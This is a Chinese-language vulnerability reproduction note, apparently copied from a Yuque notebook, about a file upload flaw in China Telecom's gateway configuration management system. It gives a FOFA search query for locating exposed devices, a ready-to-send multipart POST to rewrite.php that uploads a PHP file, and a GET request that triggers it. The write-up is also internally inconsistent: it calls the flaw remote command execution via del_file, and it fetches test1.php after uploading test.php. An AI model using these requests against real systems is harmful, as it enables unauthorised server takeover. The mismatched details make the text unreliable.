# 电信网关配置管理系统rewrite存在文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">中国电信集团有限公司（英文名称“China Telecom”、简称“中国电信”）成立于2000年9月，是中国特大型国有通信企业、上海世博会全球合作伙伴。电信网关配置管理系统del_file存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 电信网关配置管理系统

# 三、资产测绘
+ fofa`body="img/dl.gif" && title="系统登录"`
+ 特征

![1713231679173-db9b0c3c-79d6-4f91-baac-a8358f5ccad1.png](./img/8c5EN0nJePhVygzM/1713231679173-db9b0c3c-79d6-4f91-baac-a8358f5ccad1-275973.png)

# 四、漏洞复现
```java
POST /manager/teletext/material/rewrite.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
Connection: close
 
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="tmp_name"; filename="test.php"
Content-Type: image/png
 
<?php echo md5('666');unlink(__FILE__);?>
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="uploadtime"
 
 
------WebKitFormBoundaryOKldnDPT--
```

![1715354904567-3e7260cf-b3ae-4345-bbb9-4ebc6db96872.png](./img/8c5EN0nJePhVygzM/1715354904567-3e7260cf-b3ae-4345-bbb9-4ebc6db96872-007827.png)

上传文件地址

```java
GET /xmedia/material/test1.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Connection: close
```

![1715354913211-9d648019-ec1d-43a8-9f31-328adcc87fcb.png](./img/8c5EN0nJePhVygzM/1715354913211-9d648019-ec1d-43a8-9f31-328adcc87fcb-610528.png)



> 更新: 2024-05-14 11:21:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ukcgt02yr1b4yu4l>